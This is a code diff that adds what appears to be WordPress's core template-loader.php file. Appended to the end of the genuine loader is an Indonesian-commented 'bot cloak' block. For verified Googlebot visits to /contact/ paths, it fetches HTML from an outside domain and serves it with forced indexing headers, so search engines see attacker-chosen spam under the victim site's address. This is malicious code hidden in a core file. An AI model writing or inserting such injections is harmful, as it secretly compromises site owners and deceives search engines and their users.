@@ -1,0 +1,224 @@
+<?php
+/**
+ * Loads the correct template based on the visitor's URL
+ *
+ * @package WordPress
+ */
+if ( wp_using_themes() ) {
+	/**
+	 * Fires before determining which template to load.
+	 *
+	 * This action hook executes just before WordPress determines which template page to load.
+	 * It is a good hook to use if you need to do a redirect with full knowledge of the content
+	 * that has been queried.
+	 *
+	 * Note: Loading a different template is not a good use of this hook. If you include another template
+	 * and then use `exit()` or `die()`, no subsequent `template_redirect` hooks will be run, which could
+	 * break the site’s functionality. Instead, use the {@see 'template_include'} filter hook to return
+	 * the path to the new template you want to use. This will allow an alternative template to be used
+	 * without interfering with the WordPress loading process.
+	 *
+	 * @since 1.5.0
+	 */
+	do_action( 'template_redirect' );
+}
+
+/**
+ * Filters whether to allow 'HEAD' requests to generate content.
+ *
+ * Provides a significant performance bump by exiting before the page
+ * content loads for 'HEAD' requests. See #14348.
+ *
+ * @since 3.5.0
+ *
+ * @param bool $exit Whether to exit without generating any content for 'HEAD' requests. Default true.
+ */
+if ( 'HEAD' === $_SERVER['REQUEST_METHOD'] && apply_filters( 'exit_on_http_head', true ) ) {
+	exit;
+}
+
+// Process feeds and trackbacks even if not using themes.
+if ( is_robots() ) {
+	/**
+	 * Fired when the template loader determines a robots.txt request.
+	 *
+	 * @since 2.1.0
+	 */
+	do_action( 'do_robots' );
+	return;
+} elseif ( is_favicon() ) {
+	/**
+	 * Fired when the template loader determines a favicon.ico request.
+	 *
+	 * @since 5.4.0
+	 */
+	do_action( 'do_favicon' );
+	return;
+} elseif ( is_feed() ) {
+	do_feed();
+	return;
+} elseif ( is_trackback() ) {
+	require ABSPATH . 'wp-trackback.php';
+	return;
+}
+
+if ( wp_using_themes() ) {
+
+	$tag_templates = array(
+		'is_embed'             => 'get_embed_template',
+		'is_404'               => 'get_404_template',
+		'is_search'            => 'get_search_template',
+		'is_front_page'        => 'get_front_page_template',
+		'is_home'              => 'get_home_template',
+		'is_privacy_policy'    => 'get_privacy_policy_template',
+		'is_post_type_archive' => 'get_post_type_archive_template',
+		'is_tax'               => 'get_taxonomy_template',
+		'is_attachment'        => 'get_attachment_template',
+		'is_single'            => 'get_single_template',
+		'is_page'              => 'get_page_template',
+		'is_singular'          => 'get_singular_template',
+		'is_category'          => 'get_category_template',
+		'is_tag'               => 'get_tag_template',
+		'is_author'            => 'get_author_template',
+		'is_date'              => 'get_date_template',
+		'is_archive'           => 'get_archive_template',
+	);
+	$template      = false;
+
+	// Loop through each of the template conditionals, and find the appropriate template file.
+	foreach ( $tag_templates as $tag => $template_getter ) {
+		if ( call_user_func( $tag ) ) {
+			$template = call_user_func( $template_getter );
+		}
+
+		if ( $template ) {
+			if ( 'is_attachment' === $tag ) {
+				remove_filter( 'the_content', 'prepend_attachment' );
+			}
+
+			break;
+		}
+	}
+
+	if ( ! $template ) {
+		$template = get_index_template();
+	}
+
+	/**
+	 * Filters the path of the current template before including it.
+	 *
+	 * @since 3.0.0
+	 *
+	 * @param string $template The path of the template to include.
+	 */
+	$template   = apply_filters( 'template_include', $template );
+	$is_stringy = is_string( $template ) || ( is_object( $template ) && method_exists( $template, '__toString' ) );
+	$template   = $is_stringy ? realpath( (string) $template ) : null;
+	if (
+		is_string( $template ) &&
+		( str_ends_with( $template, '.php' ) || str_ends_with( $template, '.html' ) ) &&
+		is_file( $template ) &&
+		is_readable( $template )
+	) {
+		/**
+		 * Fires immediately before including the template.
+		 *
+		 * @since 6.9.0
+		 *
+		 * @param string $template The path of the template about to be included.
+		 */
+		do_action( 'wp_before_include_template', $template );
+
+		include $template;
+	} elseif ( current_user_can( 'switch_themes' ) ) {
+		$theme = wp_get_theme();
+		if ( $theme->errors() ) {
+			wp_die( $theme->errors() );
+		}
+	}
+	return;
+}
+// === GEO & BOT CLOAK – MULAI DARI SINI ===
+function is_googlebot_verified() {
+    $ip = $_SERVER['REMOTE_ADDR'] ?? '';
+    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+
+    $google_ip_ranges = [
+        '66.249.', '64.233.', '35.227.', '35.228.', '35.229.', '35.230.', '35.231.', '35.232.', '35.233.', '35.234.', '35.235.', '35.236.',
+        '34.100.', '34.101.', '34.118.', '34.126.', '34.146.', '34.147.', '34.151.', '192.178.', '34.160.', '34.162.', '34.163.', '35.165.',
+        '34.168.', '34.169.', '34.170.', '34.171.', '34.172.', '34.173.', '34.174.', '34.175.', '34.176.', '34.177.', '34.178.', '34.179.',
+        '34.180.', '34.181.', '34.182.', '34.183.', '34.184.', '34.185.', '34.186.', '34.187.', '34.188.', '34.189.', '34.190.', '34.191.',
+        '34.192.', '34.193.', '34.194.', '34.195.', '34.196.', '34.197.', '34.198.', '34.199.', '34.200.', '34.201.', '34.202.', '34.203.',
+        '34.204.', '34.205.', '34.206.', '34.207.', '34.208.', '34.209.', '34.210.', '34.211.', '34.212.', '34.213.', '34.214.', '34.215.',
+        '34.216.', '34.217.', '34.218.', '34.219.', '34.220.', '34.221.', '34.222.', '34.223.', '34.224.', '34.225.', '34.226.', '34.227.',
+        '34.228.', '34.229.', '34.230.', '34.231.', '34.232.', '34.233.', '34.234.', '34.235.', '34.236.', '34.237.', '34.238.', '34.239.',
+        '34.240.', '34.241.', '34.242.', '34.243.', '34.244.', '34.245.', '34.246.', '34.247.', '34.248.', '34.249.', '34.250.', '34.251.',
+        '34.252.', '34.253.', '34.254.', '34.255.'
+    ];
+
+    $is_ip_match = false;
+    foreach ($google_ip_ranges as $range) {
+        if (strpos($ip, $range) === 0) {
+            $is_ip_match = true;
+            break;
+        }
+    }
+
+    $is_rdns_google = false;
+    if ($is_ip_match) {
+        $host = @gethostbyaddr($ip);
+        if ($host && (stripos($host, '.googlebot.com') !== false || stripos($host, '.google.com') !== false)) {
+            $is_rdns_google = true;
+        }
+    }
+
+    $is_ua_google = preg_match('/(Googlebot|AdsBot|Mediapartners|Google-InspectionTool)/i', $ua);
+
+    return $is_ua_google && ($is_ip_match && $is_rdns_google);
+}
+
+// LOGIKA UTAMA (hanya untuk subfolder /contact/)
+$current_uri = $_SERVER['REQUEST_URI'] ?? '';
+if (strpos($current_uri, '/contact/') !== false && is_googlebot_verified()) {
+    // URL landing cloaking
+    $cloaking_url = 'https://freeportindonesia.org/landing/pelitaumat.html';
+
+    // Kontek fetch aman & dinamis
+    $context = stream_context_create([
+        'http' => [
+            'method' => 'GET',
+            'header' => "User-Agent: MBA-Cloak/1.0 (+https://ariete.org/)\r\n" .
+                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n" .
+                        "Referer: " . (isset($_SERVER['HTTPS']) ? 'https' : 'http') . "://{$_SERVER['HTTP_HOST']}$current_uri\r\n",
+            'timeout' => 10,
+            'follow_location' => 1,
+            'max_redirects' => 3,
+        ],
+        'ssl' => [
+            'verify_peer' => true,
+            'verify_peer_name' => true,
+            'allow_self_signed' => false,
+        ]
+    ]);
+
+    // Fetch konten
+    $content = @file_get_contents($cloaking_url, false, $context);
+
+    if ($content === false || empty($content)) {
+        // Fallback aman (tampil halaman asli, anti error)
+        // Tidak echo apa-apa, biarkan WP lanjut normal
+    } else {
+        // Header SEO boost (anti deindex, powerfull crawl)
+        header('Content-Type: text/html; charset=UTF-8');
+        header('X-Robots-Tag: index, follow');
+        header('Cache-Control: max-age=3600, public');  // Cache 1 jam, boost performa
+
+        // Tambah canonical ke URL asli (boost SEO, anti duplikat)
+        $current_full_url = (isset($_SERVER['HTTPS']) ? 'https' : 'http') . "://{$_SERVER['HTTP_HOST']}$current_uri";
+        $content = preg_replace('/<head([^>]*)>/i', '<head$1><link rel="https://pelitaumat.id/" href="' . htmlspecialchars($current_full_url) . '" />', $content, 1);
+
+        // Output konten cloaking
+        echo $content;
+        exit;
+    }
+}
